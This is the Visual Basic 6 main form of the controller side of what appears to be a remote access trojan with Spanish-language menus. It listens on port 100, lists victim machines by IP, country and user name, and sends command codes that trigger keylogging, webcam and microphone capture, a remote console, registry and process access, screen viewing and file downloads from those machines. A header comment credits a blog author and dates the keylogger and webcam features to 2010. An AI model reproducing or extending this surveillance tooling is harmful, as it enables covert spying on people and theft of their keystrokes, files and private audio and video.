VERSION 5.00
Begin VB.Form FrmMain 
   Caption         =   "Servidor"
   ClientHeight    =   6765
   ClientLeft      =   60
   ClientTop       =   630
   ClientWidth     =   13650
   Icon            =   "FrmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   451
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   910
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox PicContainer 
      BackColor       =   &H8000000B&
      BorderStyle     =   0  'None
      Height          =   3735
      Left            =   8040
      ScaleHeight     =   3735
      ScaleWidth      =   4215
      TabIndex        =   2
      Top             =   120
      Visible         =   0   'False
      Width           =   4215
      Begin Servidor.ucToolbar ucToolbar2 
         Height          =   375
         Left            =   120
         Top             =   2040
         Width           =   1935
         _ExtentX        =   3413
         _ExtentY        =   661
      End
      Begin Servidor.ucToolbar ucToolbar1 
         Height          =   375
         Left            =   0
         Top             =   600
         Width           =   3975
         _ExtentX        =   4048
         _ExtentY        =   661
      End
      Begin VB.PictureBox PicSpliter 
         BorderStyle     =   0  'None
         DrawWidth       =   2
         Height          =   135
         Left            =   120
         MousePointer    =   7  'Size N S
         ScaleHeight     =   9
         ScaleMode       =   3  'Pixel
         ScaleWidth      =   105
         TabIndex        =   5
         Top             =   2880
         Width           =   1575
      End
      Begin Servidor.ucListView ucListView3 
         Height          =   1215
         Left            =   2280
         TabIndex        =   3
         Top             =   2280
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   2143
      End
      Begin Servidor.ucListView ucListView2 
         Height          =   855
         Left            =   2040
         TabIndex        =   4
         Top             =   1200
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   1508
      End
   End
   Begin Servidor.ucStatusbar ucStatusbar1 
      Align           =   2  'Align Bottom
      Height          =   495
      Left            =   0
      Top             =   6270
      Width           =   13650
      _ExtentX        =   24077
      _ExtentY        =   873
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1560
      Top             =   5280
   End
   Begin Servidor.ucListView ucListView1 
      Height          =   4095
      Left            =   3480
      TabIndex        =   0
      Top             =   240
      Width           =   5055
      _ExtentX        =   8916
      _ExtentY        =   7223
   End
   Begin Servidor.TabStrip TabStrip1 
      Height          =   4815
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   12495
      _ExtentX        =   22040
      _ExtentY        =   8493
      Begin Servidor.ucTreeView ucTreeView1 
         Height          =   2295
         Left            =   840
         TabIndex        =   6
         Top             =   240
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   4048
      End
   End
End
Attribute VB_Name = "FrmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
' ---------------------------------------------------
'                   09/12/2010  Added KeyLogger, Console, WebCam, Registry, Process and Windows
'                   Published: Harmmy
'                   harmmy.blogspot.com
' ---------------------------------------------------
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function GetVersion Lib "kernel32" () As Long
Private Declare Sub InitCommonControls Lib "comctl32.dll" ()

Private Const SW_SHOWNORMAL As Long = &H1


Dim cImgList As clsImgList


Private Sub Form_Initialize()


    Call InitCommonControls
    
    OS_Version = (GetVersion And &HFF)
    
    If OS_Version < 5 Then
        MsgBox "Systema Operativo no soportado", vbCritical
        End
    End If
    
    Call InitCommonControls
End Sub


Private Sub Form_Load()

    MdlINI.FileName = App.Path & "\Conf.ini"
   
    Dim hIcon As Long
    
    '*----------Puerto de escucha-------------*
        m_Port = 100
    '*----------------------------------------*

    Set cColl = New Collection
    
    ReDim Id_List(0)
    
    With ucTreeView1
        
        Call .Initialize
        Call .InitializeImageList
     
        Call .AddBitmap(LoadResPicture(8, vbResBitmap))

        
        .HasLines = True
        .HasButtons = True


        Call .SetRedrawMode(Enable:=False)
        
        Dim NodRoot, NodChild
        
        NodRoot = .AddNode(, , "\", "Comandos", 6, 6)
        
        NodChild = .AddNode(NodRoot, , "Console", "Consola", 0, 0, False)
        NodChild = .AddNode(NodRoot, , "Windows", "Ventanas", 1, 1, False)
        NodChild = .AddNode(NodRoot, , "Process", "Procesos", 2, 2, False)
        NodChild = .AddNode(NodRoot, , "WebCam", "WebCam", 3, 3, False)
        NodChild = .AddNode(NodRoot, , "Registry", "Registro", 4, 4, False)
        NodChild = .AddNode(NodRoot, , "KeyLogger", "KeyLogger", 5, 5, False)
        NodChild = .AddNode(NodRoot, , "Explorer", "Explorador", 6, 6, False)
        NodChild = .AddNode(NodRoot, , "Microfono", "Microfono", 7, 7, False)
        NodChild = .AddNode(NodRoot, , "Pantalla", "Pantalla", 8, 8, False)
  
        Call .Expand(NodRoot)

        Call .SetRedrawMode(Enable:=True)
        If OS_Version > 5 Then Call SetWindowTheme(.hwnd, StrPtr("explorer"), 0)
    End With
    
    
    
    
    SysImageListSmall = GetSystemImageList(SHIL_SMALL)
    SysImageListLarge = GetSystemImageList(SHIL_LARGE)
    SysImageListExtraLarge = GetSystemImageList(SHIL_EXTRALARGE)
    
        
    With ucListView1
    
        Call .Initialize
        
        .InitializeImageListSmall 16, 16
        .ImageListSmall_AddBitmap LoadResPicture(4, vbResBitmap), vbMagenta
        
        .ViewMode = vmDetails
        .GridLines = True
        .FullRowSelect = True

        Call .ColumnAdd(0, "IP", 100)
        Call .ColumnAdd(1, "Sock", 50)
        Call .ColumnAdd(2, "ID", 100)
        Call .ColumnAdd(3, "Country", 100)
        Call .ColumnAdd(4, "User @ Computer", 150)
        Call .ColumnAdd(5, "OS", 100)

        If OS_Version > 5 Then Call SetWindowTheme(.hwnd, StrPtr("explorer"), 0)
    End With

    With ucStatusbar1
        
        Call .Initialize(SizeGrip:=True)
        Call .InitializeIconList
        Call .AddBitmap(LoadResPicture(6, vbResBitmap))

        Call .AddPanel(, , , [sbSpring], , , 0)
        Call .AddPanel(, 120, , [sbContents], , , 1)
        Call .AddPanel(, 120, , [sbContents], , , 2)

    End With
    
    With ucListView2
    
        Call .Initialize
        .hHeaderImgList = ucStatusbar1.hImageList
        .hSmallImgList = GetSystemImageList(SHGFI_SMALLICON)
    
        .ViewMode = vmDetails
        .GridLines = True
        .FullRowSelect = True
        
        .SubItemProgress = 3
        Call .ColumnAdd(0, "Nombre", 200, [caLeft], 1)
        Call .ColumnAdd(1, "Cliente", 100, [caLeft])
        Call .ColumnAdd(2, "Estado", 100, [caLeft])
        Call .ColumnAdd(3, "Progreso", 80, [caCenter])
        Call .ColumnAdd(4, "Velocidad", 80, [caRight])
        Call .ColumnAdd(5, "Tiempo Restante", 100, [caRight])
        Call .ColumnAdd(6, "Descargados", 100, [caRight])
        Call .ColumnAdd(7, "Destino", 200, [caLeft])

        If OS_Version > 5 Then Call SetWindowTheme(.hwnd, StrPtr("explorer"), 0)
    End With
    
    With ucListView3
    
        Call .Initialize
        .hHeaderImgList = ucStatusbar1.hImageList
        .hSmallImgList = GetSystemImageList(SHGFI_SMALLICON)
        
        .ViewMode = vmDetails
        .GridLines = True
        .FullRowSelect = True
        
        .SubItemProgress = 3
        Call .ColumnAdd(0, "Nombre", 200, [caLeft], 2)
        Call .ColumnAdd(1, "Cliente", 100, [caLeft])
        Call .ColumnAdd(2, "Estado", 100, [caLeft])
        Call .ColumnAdd(3, "Progreso", 80, [caCenter])
        Call .ColumnAdd(4, "Velocidad", 80, [caRight])
        Call .ColumnAdd(5, "Tiempo Restante", 100, [caRight])
        Call .ColumnAdd(6, "Descargados", 100, [caRight])
        'Call .ColumnAdd(7, "Destino", 200, [caLeft])
        
        If OS_Version > 5 Then Call SetWindowTheme(.hwnd, StrPtr("explorer"), 0)
    End With
    
    MdlListViewProgress.Initialize
    'MdlListViewProgress.UseWindowsTheme = True
    
    Set cImgList = New clsImgList
    
    With cImgList
        .Init 16, 16
        .AddBitmap LoadResPicture(0, vbResBitmap)
    End With
    
    With TabStrip1
        .hImageList = cImgList.hwnd
        .AddTab 0, "Conexiones", , 0
        .AddTab 1, "Transferencia", , 1
    End With
    
    With ucToolbar1
        Dim hBitmap As Long

        Call .Initialize(ImageSize:=16, FlatStyle:=True, ListStyle:=True, Divider:=True)

        Call .AddBitmap(LoadResPicture(1, vbResBitmap))
        
        Call .AddButton("Cancelar", 0, "Cancelar")
        Call .AddButton("Abrir", 1, "Abrir")
        Call .AddButton("Abrir carpeta", 2, "Abrircarpeta")
        Call .AddButton("Limpiar errónes y completos", 3, "Limpiar errónes y completos")
  
        .Tansparent = True

        Let .Height = .ToolbarHeight * Screen.TwipsPerPixelY
    End With
        
    With ucToolbar2
   
        Call .Initialize(ImageSize:=16, FlatStyle:=True, ListStyle:=True, Divider:=True)
                                              
        Call .AddBitmap(LoadResPicture(1, vbResBitmap))
        
        Call .AddButton("Cancelar", 0, "Cancelar")
        Call .AddButton("Limpiar errónes y completos", 3, "Limpiar errónes y completos")
        
        .Tansparent = True
 
        Let .Height = .ToolbarHeight * Screen.TwipsPerPixelY
    End With
    
    CheckButtonState
    
    WinSock32.InitWinSock Me
    
    If WinSock32.WsListenInPort(m_Port) = 0 Then
        MsgBox "Error, el puerto " & m_Port & " se encuentra en uso." & vbCrLf & _
               "Cierre las aplicación que esten ocupando dicho puerto, y vuelva a ejecutar " & App.EXEName, vbInformation
        Unload Me
        Exit Sub
    End If
    
    Me.Caption = App.EXEName & " - " & WinSock32.GetLocalIp
    
    FrmMain.RefreshStatusBar
    
    MdlINI.ReadFormPosAndSize Me
End Sub


Private Function ActivateForm(ByVal sName As String, ByVal ParentID As Long, Optional FrmReturn As Form) As Boolean
    Dim Frm As Form
    
    For Each Frm In Forms
        If Frm.Name = sName Then
            If Frm.ParentID = ParentID Then
                ActivateForm = True
                If Frm.WindowState = vbMinimized Then Frm.WindowState = vbNormal
                Frm.Show , Me
                Set FrmReturn = Frm
                Exit Function
            End If
        End If
    Next
End Function


Private Sub Form_Resize()
    On Error Resume Next
    Dim i As Long
    
    If Me.WindowState = vbMinimized Then Exit Sub
    
    TabStrip1.Move 0, 0, Me.ScaleWidth, Me.ScaleHeight - ucStatusbar1.Height
    ucTreeView1.Move 40, 375, 245 * Screen.TwipsPerPixelX, (TabStrip1.Height - 31) * Screen.TwipsPerPixelY
    ucListView1.Move 252, 25, TabStrip1.Width - 255, TabStrip1.Height - 31
    PicContainer.Move 4, 25, Me.ScaleWidth - 10, TabStrip1.Height - 31
    PicSpliter.Move 0, PicSpliter.Top, PicContainer.ScaleWidth

    With PicSpliter

        If .Top + 2300 > Me.Height Then
            .Top = Me.Height - 2300
        End If
        .AutoRedraw = True
        .Cls
        .ForeColor = vb3DHighlight
        For i = PicSpliter.ScaleWidth / 2 - 40 To PicSpliter.ScaleWidth / 2 + 40 Step 7
            PicSpliter.PSet (i, 4)
        Next

        .ForeColor = vbInactiveBorder
        
        For i = PicSpliter.ScaleWidth / 2 - 40 To PicSpliter.ScaleWidth / 2 + 40 Step 7
            PicSpliter.PSet (i - 1, 3)
        Next
        .Refresh
        .AutoRedraw = False
    End With
    Call AjustLV
End Sub


Private Sub AjustLV()
    On Error Resume Next
    ucToolbar1.Move 0, 0, PicContainer.ScaleWidth
    ucToolbar2.Move 0, PicSpliter.Top + PicSpliter.ScaleHeight * Screen.TwipsPerPixelY, PicContainer.ScaleWidth
    ucListView2.Move 0, ucToolbar1.Height, PicContainer.ScaleWidth, PicSpliter.Top - ucToolbar1.Height
    ucListView3.Move 0, ucToolbar2.Top + ucToolbar2.Height, PicContainer.ScaleWidth, PicContainer.ScaleHeight - (ucToolbar2.Top + ucToolbar2.Height)
End Sub


Private Sub Form_Unload(Cancel As Integer)
    Dim Frm As Form
    ucListView2.hSmallImgList = 0
    ucListView3.hSmallImgList = 0
    
    For Each Frm In Forms
        Unload Frm
    Next

    WinSock32.WsClosePort 100, True
    WinSock32.TerminateWinSock
    
    MdlINI.SaveFormPosAndSize Me
End Sub

Public Sub Socket_Conect(id As Long, IP As String, Puerto As String)
    On Error Resume Next
    Dim cConnection As clsConnection
    Set cConnection = New clsConnection
    
    cConnection.ClassID = id
    cColl.Add cConnection, CStr(id)

    
    If err.Number Then Debug.Print "Socket_Conect: ", err.Description
End Sub

Public Sub Socket_DataArrival(id As Long, IP As String, Puerto As String, Data As String)
    On Error Resume Next
    cColl(CStr(id)).Socket_DataArrival id, IP, Puerto, Data
    If err.Number Then Debug.Print "Socket_DataArrival: ", err.Description
End Sub

Public Sub Socket_Close(id As Long, IP As String, Puerto As String)
    On Error Resume Next
    cColl(CStr(id)).Socket_Close id, IP, Puerto
    If err.Number Then Debug.Print "Socket_Close", err.Description
End Sub

Private Sub PicSpliter_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    On Error Resume Next
    Static LastY As Single
    Dim lPos As Long
    
    If Button = 1 Then
        lPos = PicSpliter.Top + (Y - LastY) * Screen.TwipsPerPixelY
        If lPos > 1000 And lPos < PicContainer.ScaleHeight - 1000 Then
            PicSpliter.Top = lPos
            Call AjustLV
        End If
    Else
        LastY = Y
    End If

End Sub

Public Sub RefreshList()
    On Error Resume Next
    
    Dim vItem As Variant
    Dim j As Long
    Dim ret As Long
    Dim uSHFI As SHFILEINFO
    Dim ItemCount As Long

    For Each vItem In cColl
        If vItem.clsType = enuFileTransfer Then
            If vItem.cServerDataType = enuFileRecibed Then
                With ucListView2
                    ret = ExistItemData(ucListView2, vItem.SocketID)
                    If ret <> -1 Then
                        .SubItemText(ret, 2) = vItem.sState
                        .SubItemText(ret, 3) = vItem.Percent
                        .SubItemText(ret, 4) = vItem.Speed
                        .SubItemText(ret, 5) = vItem.TimeRemaining
                        .SubItemText(ret, 6) = GetFormatSizeFile(vItem.FilePos) & " de " & GetFormatSizeFile(vItem.mFileSize)
                    Else
                        Call SHGetFileInfo(CStr(vItem.mFilename), ByVal 0&, uSHFI, Len(uSHFI), SHGFI_USEFILEATTRIBUTES Or SHGFI_SYSICONINDEX Or SHGFI_SMALLICON Or SHGFI_TYPENAME)
                        ItemCount = .Count
                        .ItemAdd ItemCount, vItem.mFilename, 0, uSHFI.iIcon, vItem.SocketID
                        .SubItemText(ItemCount, 1) = vItem.IP
                        .SubItemText(ItemCount, 2) = vItem.sState
                        .SubItemText(ItemCount, 3) = vItem.Percent
                        .SubItemText(ItemCount, 7) = GetDirFromPath(vItem.mDestPath)
                        .ItemSelected(.Count - 1) = True
                    End If
                End With
                
            Else
                With ucListView3
                    ret = ExistItemData(ucListView3, vItem.SocketID)
                    If ret <> -1 Then
                        .SubItemText(ret, 2) = vItem.sState
                        .SubItemText(ret, 3) = vItem.Percent
                        .SubItemText(ret, 4) = vItem.Speed
                        .SubItemText(ret, 5) = vItem.TimeRemaining
                        .SubItemText(ret, 6) = GetFormatSizeFile(vItem.FilePos) & " de " & GetFormatSizeFile(vItem.mFileSize)
                    Else
                        Call SHGetFileInfo(CStr(vItem.mFilename), ByVal 0&, uSHFI, Len(uSHFI), SHGFI_USEFILEATTRIBUTES Or SHGFI_SYSICONINDEX Or SHGFI_SMALLICON Or SHGFI_TYPENAME)
                        ItemCount = .Count
                        .ItemAdd ItemCount, vItem.mFilename, 0, uSHFI.iIcon, vItem.SocketID
                        .SubItemText(ItemCount, 1) = vItem.IP
                        .SubItemText(ItemCount, 2) = vItem.sState
                        .SubItemText(ItemCount, 3) = vItem.Percent
                        .SubItemText(ItemCount, 7) = GetDirFromPath(vItem.mDestPath)
                    End If
                End With
            End If
            
            
        End If
    Next
    
    CheckButtonState
    RefreshStatusBar
    If err.Number Then Debug.Print "RefreshList: " & err.Description
End Sub

Public Sub RefreshStatusBar()
    On Error Resume Next
    
    Dim lCount As Long
    Dim i As Long
    ucStatusbar1.PanelText(1) = ucListView1.Count & " Conexiones"
    
    For i = 0 To ucListView2.Count
        If ucListView2.SubItemText(i, 2) = "Descargando" Then
            lCount = lCount + 1
        End If
    Next
    ucStatusbar1.PanelText(2) = "Descargando: " & lCount
    
    lCount = 0
    For i = 0 To ucListView2.Count
        If ucListView3.SubItemText(i, 2) = "Transfiriendo" Then
            lCount = lCount + 1
        End If
    Next
    ucStatusbar1.PanelText(3) = "Subiendo: " & lCount
End Sub


Private Sub TabStrip1_TabClick(ByVal lTab As Long)
    ucListView1.Visible = (lTab = 0)
    PicContainer.Visible = (lTab = 1)
    Timer1.Enabled = (lTab = 1)
    RefreshList
End Sub

Private Sub Timer1_Timer()
    RefreshList
End Sub

Private Function ExistItemData(LV As ucListView, ByVal iData As Long) As Long
    Dim i As Long
    
    ExistItemData = -1
    
    For i = 0 To LV.Count
        If LV.ItemData(i) = iData Then
            ExistItemData = i
            Exit Function
        End If
    Next
    
End Function



Public Sub EndFileTransfer(Optional ByVal cFileTrans As clsFileTransfer)
    Dim Frm As Form
    Set Frm = New FrmNotify
    
    If cFileTrans.cServerDataType = enuFileSend Then
        Frm.Image1.Picture = LoadResPicture(102, vbResIcon)
    Else
        Frm.Image1.Picture = LoadResPicture(103, vbResIcon)
    End If
    
    Frm.Label1.Caption = cFileTrans.mFilename
    ShowFormNotify Frm, Slide, 3000, 200
    RefreshList
End Sub

Private Sub ucListView1_ItemDblClick(Item As Long)
    Dim id As Long
    id = ucListView1.ItemData(Item)
    'WinSock32.SendData ID, "0" & Delimiter & ID 'Explorer
    'WinSock32.SendData ID, "1" & Delimiter & ID 'WebCam
    'WinSock32.SendData ID, "2" & Delimiter & ID 'KeyLogger
    'WinSock32.SendData ID, "3" & Delimiter & ID 'Console
    'WinSock32.SendData ID, "4" & Delimiter & ID 'Registry
    'WinSock32.SendData id, "5" & Delimiter & id 'Process
    'WinSock32.SendData id, "7" & Delimiter & id 'Audio
    WinSock32.SendData id, "8" & Delimiter & id 'Remote Desktop
End Sub

Private Sub ucListView2_ItemDblClick(Item As Long)
    If ucListView3.SubItemText(Item, 2) = "Completo" Then
        ShellExecute 0&, vbNullString, ucListView2.SubItemText(Item, 7) & ucListView2.ItemText(Item), vbNullString, "C:\", SW_SHOWNORMAL
    Else
        Beep
    End If
End Sub

Private Sub ucToolbar1_ButtonClick(ByVal Button As Long)

On Error GoTo Handler

    Dim i As Long
    Dim sState As String
    Dim Item As Long
    
    Item = ucListView2.GetSelectedItem

    Select Case Button
        Case 1
            cColl(CStr(ucListView2.ItemData(Item))).Cancel
        Case 2
            ShellExecute 0&, vbNullString, ucListView2.SubItemText(Item, 7) & ucListView2.ItemText(Item), vbNullString, "C:\", SW_SHOWNORMAL
        Case 3
            ShellExecute 0&, vbNullString, ucListView2.SubItemText(Item, 7), vbNullString, "C:\", SW_SHOWNORMAL
        Case 4
            For i = ucListView2.Count - 1 To 0 Step -1
                sState = ucListView2.SubItemText(i, 2)
                If sState = "Error" Or sState = "Cancelado" Or sState = "Completo" Then
                    ucListView2.ItemRemove i
                End If
            Next
    End Select
    
    CheckButtonState
    Exit Sub
Handler:
    MsgBox err.Description, vbCritical, "Error " & err.Number
End Sub

Private Sub ucListView2_ItemClick(Item As Long)
    CheckButtonState
End Sub

Private Sub ucListView3_ItemClick(Item As Long)
    CheckButtonState
End Sub

Private Sub CheckButtonState()
    Dim sState As String, i As Long
    

    If ucListView2.Count Then
        sState = ucListView2.SubItemText(ucListView2.GetSelectedItem, 2)
        ucToolbar1.ButtonEnabled(1) = (sState = "Descargando")
        ucToolbar1.ButtonEnabled(2) = (sState = "Completo")
        ucToolbar1.Enabled = True
    Else
        ucToolbar1.Enabled = False
    End If

    If ucListView3.Count Then
        ucToolbar2.Enabled = True
        sState = ucListView3.SubItemText(ucListView3.GetSelectedItem, 2)
        ucToolbar2.ButtonEnabled(1) = (sState = "Transfiriendo")
    Else
        ucToolbar2.Enabled = False
    End If

End Sub

Private Sub ucToolbar2_ButtonClick(ByVal Button As Long)

On Error GoTo Handler

    Dim i As Long
    Dim sState As String
    
    Select Case Button
        Case 1
            cColl(CStr(ucListView3.ItemData(ucListView3.GetSelectedItem))).Cancel
        Case 2
            For i = ucListView3.Count - 1 To 0 Step -1
                sState = ucListView3.SubItemText(i, 2)
                If sState = "Error" Or sState = "Cancelado" Or sState = "Completo" Then
                    ucListView3.ItemRemove i
                End If
            Next
    End Select
    
    Exit Sub
    
Handler:
    MsgBox err.Description, vbCritical, "Error " & err.Number
    
End Sub

Private Sub ucTreeView1_NodeDblClick(ByVal hNode As Long)
    Dim id As Long
    Dim Frm As Form
    
    If ucListView1.Count = 0 Then
        MsgBox "No hay ninguna conexión establecida.", vbExclamation
        Exit Sub
    End If
    
    If ucListView1.GetSelectedItem = -1 Then
        MsgBox "Seleccione alguna conexión.", vbExclamation
        Exit Sub
    End If
        
    id = ucListView1.ItemData(ucListView1.GetSelectedItem)

    Select Case ucTreeView1.GetNodeKey(hNode)
        Case "Explorer"
            WinSock32.SendData id, "0" & Delimiter & id 'Explorer
        Case "WebCam"
            If Not ActivateForm("FrmWebCam", id, Frm) Then
                WinSock32.SendData id, "1" & Delimiter & id 'WebCam
            End If
        Case "KeyLogger"
            If Not ActivateForm("FrmKeyLogger", id, Frm) Then
                WinSock32.SendData id, "2" & Delimiter & id 'KeyLogger
            End If
        Case "Console"
            If Not ActivateForm("FrmCmd", id, Frm) Then
                WinSock32.SendData id, "3" & Delimiter & id 'Console
            End If
        Case "Registry"
            If Not ActivateForm("FrmRegistry", id, Frm) Then
                WinSock32.SendData id, "4" & Delimiter & id 'Registry
            End If
        Case "Process"
            If ActivateForm("FrmProcess", id, Frm) Then
                Frm.TabStrip1.SelectedItem = 1
            Else
                WinSock32.SendData id, "5" & Delimiter & id 'Process
            End If
        Case "Windows"
            If ActivateForm("FrmProcess", id, Frm) Then
                Frm.TabStrip1.SelectedItem = 0
            Else
                WinSock32.SendData id, "6" & Delimiter & id 'Process
            End If
            
        Case "Microfono"
            If Not ActivateForm("FrmAudio", id, Frm) Then
                WinSock32.SendData id, "7" & Delimiter & id 'Audio
            End If
            
         Case "Pantalla"
            If Not ActivateForm("FrmDesktop", id, Frm) Then
                WinSock32.SendData id, "8" & Delimiter & id 'Audio
            End If

    End Select
            

End Sub
